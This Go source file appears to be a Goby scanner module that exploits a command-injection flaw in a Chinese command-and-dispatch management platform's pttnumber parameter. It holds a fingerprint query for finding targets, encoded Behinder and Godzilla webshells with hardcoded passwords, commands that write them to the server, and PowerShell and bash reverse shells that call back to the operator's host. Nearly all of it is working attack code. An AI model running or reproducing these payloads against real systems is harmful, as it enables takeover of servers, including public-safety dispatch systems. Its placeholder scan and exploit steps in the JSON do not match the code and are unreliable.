package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Command and Dispatch Management Platform /ptt/invite_one_ptter.php file pttnumber parameter Command Execution Vulnerability",
    "Description": "<p>This platform integrates various communication methods such as voice, video, and data, enabling rapid and accurate command and dispatch operations. Through this platform, users can grasp the situation on the ground in real-time, make quick decisions, and enhance their ability to respond to emergencies. Additionally, the platform possesses high scalability and flexibility, allowing for customized development to meet the diverse communication needs of different industries and scenarios. With continuous research and technical support from Fujian Kelitun Communication Co., Ltd., the Command and Dispatch Platform has been widely used in various fields, providing robust communication support for public safety and enterprise operations.</p><p>Command and Dispatch Management Platform has a command execution vulnerability in the \"pttnumber\" parameter of the \"/ptt/invite_one_ptter.php\" file. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Product": "Command-Dispatch-MP",
    "Homepage": "https://www.yulongyidong.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-03-27",
    "Author": "2783712916@qq.com",
    "FofaQuery": "body=\"msg == 'incorrect account information'||msg == 'incorrect+account+information'\" || body=\"app/structure/departments.php\"",
    "GobyQuery": "body=\"msg == 'incorrect account information'||msg == 'incorrect+account+information'\" || body=\"app/structure/departments.php\"",
    "Level": "3",
    "Impact": "<p>Command and Dispatch Management Platform has a command execution vulnerability in the \"pttnumber\" parameter of the \"/ptt/invite_one_ptter.php\" file. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Recommendation": "<p>Set access policies through firewalls and other security devices to allow access only from whitelisted sources.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom,goby_shell_linux,goby_shell_windows",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "{{{rand|str|10}}}.php",
            "show": "attackType=custom"
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "<?php @error_reporting(0);echo \"checkString\";unlink(__FILE__);?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "指挥调度管理平台 /ptt/invite_one_ptter.php 文件 pttnumber 参数 命令执行漏洞",
            "Product": "指挥调度管理平台",
            "Description": "<p>指挥调度平台是一款功能强大的通信解决方案。该平台集成了语音、视频、数据等多种通信方式，可实现快速、准确的指挥调度。通过该平台，用户可以实时掌握现场情况，迅速做出决策，提高应对突发事件的能力。同时，该平台还具备高度的可扩展性和灵活性，可根据不同行业和场景的需求进行定制化开发，满足各种复杂的通信需求。在福建科立讯通信有限公司的持续研发和技术支持下，该指挥调度平台已经在多个领域得到广泛应用，为保障公共安全和企业运营提供了强有力的通信保障。<br></p><p>指挥调度管理平台 /ptt/invite_one_ptter.php 文件 pttnumber 参数存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>通过防火墙等安全设备设置访问策略，设置白名单访问<br></p>",
            "Impact": "<p>指挥调度管理平台 /ptt/invite_one_ptter.php 文件 pttnumber 参数存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Command and Dispatch Management Platform /ptt/invite_one_ptter.php file pttnumber parameter Command Execution Vulnerability",
            "Product": "Command-Dispatch-MP",
            "Description": "<p>This platform integrates various communication methods such as voice, video, and data, enabling rapid and accurate command and dispatch operations. Through this platform, users can grasp the situation on the ground in real-time, make quick decisions, and enhance their ability to respond to emergencies. Additionally, the platform possesses high scalability and flexibility, allowing for customized development to meet the diverse communication needs of different industries and scenarios. With continuous research and technical support from Fujian Kelitun Communication Co., Ltd., the Command and Dispatch Platform has been widely used in various fields, providing robust communication support for public safety and enterprise operations.<br></p><p>Command and Dispatch Management Platform has a command execution vulnerability in the \"pttnumber\" parameter of the \"/ptt/invite_one_ptter.php\" file. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.<br></p>",
            "Recommendation": "<p>Set access policies through firewalls and other security devices to allow access only from whitelisted sources.<br></p>",
            "Impact": "<p>Command and Dispatch Management Platform has a command execution vulnerability in the \"pttnumber\" parameter of the \"/ptt/invite_one_ptter.php\" file. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	sendGetHttpXsdsd1223Asw := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		httpConfig := httpclient.NewGetRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "{\"st\":\"0\"}") || strings.Contains(resp.Utf8Html, "checktestAAAAAAAAAA")) {
			return true
		}

		return false
	}

	getOsInfoXsdsd1223Asw := func(hostInfo *httpclient.FixUrl, urlPath string) string {
		httpConfig := httpclient.NewGetRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "Windows")) {
			return "Windows"
		} else if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "Linux")) {
			return "Linux"
		}
		return resp.Utf8Html
	}

	expCheckGetHttpXsdsd1223Asw := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		httpConfig := httpclient.NewGetRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 {
			return true
		}
		return false
	}
	expCheck1VulXeh234i := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		//1. 写入base64内容
		if expCheckGetHttpXsdsd1223Asw(hostInfo, urlPath) {
			return true
		}
		return false
	}
	expCheck2VulXeh234i := func(hostInfo *httpclient.FixUrl, filename string) bool {
		// 3.判断是否解码成功
		if expCheckGetHttpXsdsd1223Asw(hostInfo, "/api/client/ptt/"+filename) {
			return true
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ss.VulURL = hostinfo.FixedHostInfo + "/api/client/ptt/invite_one_ptter.php?pttnumber="
			command := url.QueryEscape("`echo '<?php @error_reporting(0);echo \"checktestAAAAAAAAAA\";unlink(__FILE__);?>'>checktestAAAAAAAAAA.php`")
			vulPath := "/api/client/ptt/invite_one_ptter.php?pttnumber="
			if sendGetHttpXsdsd1223Asw(hostinfo, vulPath+command) {
				return sendGetHttpXsdsd1223Asw(hostinfo, "/api/client/ptt/checktestAAAAAAAAAA.php")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// ip := godclient.GetGodServerIP()
			attackType := goutils.B2S(ss.Params["attackType"])
			filename := goutils.B2S(ss.Params["filename"])
			content := goutils.B2S(ss.Params["custom"])

			if strings.Contains("behinder,godzilla,custom", attackType) {
				//获取操作系统
				command := url.QueryEscape("`echo '<?php @error_reporting(0);$osInfo = php_uname('s');echo \"$osInfo\";unlink(__FILE__);?>'>checktestAAAAAAAAAA.php`")
				vulPath := "/api/client/ptt/invite_one_ptter.php?pttnumber="
				tmpFileName := goutils.RandomHexString(10) + ".txt"
				var osInfo string
				if sendGetHttpXsdsd1223Asw(expResult.HostInfo, vulPath+command) {
					osInfo = getOsInfoXsdsd1223Asw(expResult.HostInfo, "/api/client/ptt/checktestAAAAAAAAAA.php")
				}

				if attackType == "behinder" {
					filename = goutils.RandomHexString(10) + ".php"
					content = `PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTtzZXNzaW9uX3N0YXJ0KCk7JGtleT0iOTBiNDAzMzlkOWQzYTU1NyI7JF9TRVNTSU9OWydrJ109JGtleTskZj0nZmlsZScuJ19nZXQnLidfY29udGVudHMnOyRwPSd8fHx8fHx8fHx8fCdeY2hyKDEyKS5jaHIoMjApLmNocigxMikuY2hyKDcwKS5jaHIoODMpLmNocig4MykuY2hyKDIxKS5jaHIoMTgpLmNocigxMikuY2hyKDkpLmNocig4KTskSDcxRGc9JGYoJHApO2lmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpeyAkdD1wcmVnX2ZpbHRlcignLysvJywnJywnYmFzZSs2NCtfK2RlY28rZGUnKTskSDcxRGc9JHQoJEg3MURnLiIiKTtmb3IoJGk9MDskaTxzdHJsZW4oJEg3MURnKTskaSsrKSB7ICRuZXdfa2V5ID0gJGtleVskaSsxJjE1XTskSDcxRGdbJGldID0gJEg3MURnWyRpXSBeICRuZXdfa2V5O30JfWVsc2V7ICRINzFEZz1vcGVuc3NsX2RlY3J5cHQoJEg3MURnLCAiQUVTMTI4IiwgJGtleSk7fSRhcnI9ZXhwbG9kZSgnfCcsJEg3MURnKTskZnVuYz0kYXJyWzBdOyRwYXJhbXM9JGFyclsxXTtjbGFzcyBHMDZsZDcwcHsgcHVibGljIGZ1bmN0aW9uIC8qWiPvv6VoKnVAIWhORmhSN0p0NVoqL19faW52b2tlKCRwKSB7QGV2YWwoIi8qWiPvv6VoKnVAIWhORmhSN0p0NVoqLyIuJHAuIiIpO319QGNhbGxfdXNlcl9mdW5jLypaI++/pWgqdUAhaE5GaFI3SnQ1WiovKG5ldyBHMDZsZDcwcCgpLCRwYXJhbXMpOz8+`
				} else if attackType == "godzilla" {
					filename = goutils.RandomHexString(10) + ".php"
					content = `PD9waHAgQHNlc3Npb25fc3RhcnQoKTtAc2V0X3RpbWVfbGltaXQoMCk7QGVycm9yX3JlcG9ydGluZygwKTtmdW5jdGlvbiBlbmNvZGUoJEQsJEspe2ZvcigkaT0wOyRpPHN0cmxlbigkRCk7JGkrKykgeyRjID0gJEtbJGkrMSYweEZdOyREWyRpXSA9ICREWyRpXV4kYzt9cmV0dXJuICREO30kcGF5bG9hZE5hbWU9J2xvYWRTMTI5Jzska2V5PSc5MGI0MDMzOWQ5ZDNhNTU3JzskcGFzcz0namtoZGptMjM2NWprJztpZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpeyRicyA9IHByZWdfcmVwbGFjZSgnL1wqLycsICcnLCAnYmFzZSo2NCpfZGVjbypkZScpOyRwID0gJF9QT1NUWyRwYXNzXTskZGF0YT1lbmNvZGUoJGJzKCRwLiIiKSwka2V5KTtpZiAoaXNzZXQoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0pKXskcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7aWYgKHN0cnBvcygkcGF5bG9hZCwiZ2V0QmFzaWNzSW5mbyIpPT09ZmFsc2UpeyRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTt9Y2xhc3MgR0g3MHk5NzN7IHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcGF5bG9hZCkge0BldmFsKCIvKlo4Nm02MzQ5NTAqLyIuJHBheWxvYWQuIiIpO319bmV3IEdINzB5OTczKCRwYXlsb2FkKTtlY2hvIHN1YnN0cihtZDUoJHBhc3MuJGtleSksMCwxNik7ZWNobyBiYXNlNjRfZW5jb2RlKGVuY29kZShAcnVuKCRkYXRhKSwka2V5KSk7ZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTt9ZWxzZXtpZiAoc3RycG9zKCRkYXRhLCJnZXRCYXNpY3NJbmZvIikhPT1mYWxzZSl7JF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpO319fQ==`
				} else if attackType == "custom" {
					filename = filename
					contentByte := []byte(content)
					content = base64.StdEncoding.EncodeToString(contentByte)
				}
				//根据操作系统，使用不同的命令进行base64解码
				if osInfo == "Windows" {
					command = url.QueryEscape("`echo " + content + " > " + tmpFileName + "  && powershell.exe -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content -Raw -Path '" + tmpFileName + "'))) | Out-File -FilePath " + filename + " -Encoding UTF8\"`")
				} else if osInfo == "Linux" {
					command = url.QueryEscape("`echo " + content + " > " + tmpFileName + "  && (cat " + tmpFileName + " | base64 -d > " + filename + ")`")
				} else {
					expResult.Output = "利用失败，无法判断操作系统，写入文件失败\n"
					expResult.Output += osInfo
					return expResult
				}

				//1. 写入base64内容
				if !expCheck1VulXeh234i(expResult.HostInfo, vulPath+command) {
					expResult.Output = "利用失败，无法写入文件"
					return expResult
				}

				if !expCheck2VulXeh234i(expResult.HostInfo, filename) {
					expResult.Output = "利用失败，无法写入文件"
					return expResult
					return expResult
				}

				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/api/client/ptt/" + filename + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: jkhdjm2365jk\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: jkhdjm2365jk 加密器：Godzilla_ASP_RAW\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: php"

			} else if strings.Contains("goby_shell_linux,goby_shell_windows,cmd", attackType) {
				if attackType == "goby_shell_windows" {
					waitSessionCh := make(chan string)
					// 第一步，要获取到反连端口 rp
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
						log.Println("[WARNING] godclient bind failed", err)
					} else {
						ip := godclient.GetGodServerIP()
						// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
						// cmd := godclient.ReverseTCPByPowershell(rp)
						// cmd = strings.Replace(cmd, "'", "\"", -1)
						cmd := `$client = New-Object System.Net.Sockets.TCPClient("` + ip + `",` + rp + `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
						// 将输入字符串转换为 Unicode 编码
						utf16Bytes := utf16.Encode([]rune(cmd))

						// 转换为字节数组
						bytes := make([]byte, len(utf16Bytes)*2)
						for i, v := range utf16Bytes {
							bytes[i*2] = byte(v)
							bytes[i*2+1] = byte(v >> 8)
						}

						// 对字节数组进行 Base64 编码
						cmd = base64.StdEncoding.EncodeToString(bytes)

						cmd = "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -e " + cmd
						command := url.QueryEscape("`" + cmd + "`")
						//command := "`" + cmd + "`"
						vulPath := "/api/client/ptt/invite_one_ptter.php?pttnumber=" + command
						cfg := httpclient.NewGetRequestConfig(vulPath)
						cfg.VerifyTls = false
						cfg.FollowRedirect = false
						// 第三步，使用需要执行的命令生成 paylaod
						go httpclient.DoHttpRequest(expResult.HostInfo, cfg)

						// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							}
						case <-time.After(time.Second * 15):
						}
					}
				} else if attackType == "goby_shell_linux" {
					waitSessionCh := make(chan string)
					// 第一步，要获取到反连端口 rp
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
						log.Println("[WARNING] godclient bind failed", err)
					} else {
						// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
						// ReverseTCPByBash(rp) 返回的是 bash -i >& /dev/tcp/godserver/rp
						cmd := godclient.ReverseTCPByBash(rp)
						cmdByte := []byte(cmd)
						cmd = base64.StdEncoding.EncodeToString(cmdByte)

						command := url.QueryEscape("`bash -c '{echo," + cmd + "}|{base64,-d}|{bash,-i}'`")
						//command := "`" + cmd + "`"
						vulPath := "/api/client/ptt/invite_one_ptter.php?pttnumber=" + command
						cfg := httpclient.NewGetRequestConfig(vulPath)
						cfg.VerifyTls = false
						cfg.FollowRedirect = false
						go httpclient.DoHttpRequest(expResult.HostInfo, cfg)

						// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							}
						case <-time.After(time.Second * 15):
						}
					}
				}
			} else {
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
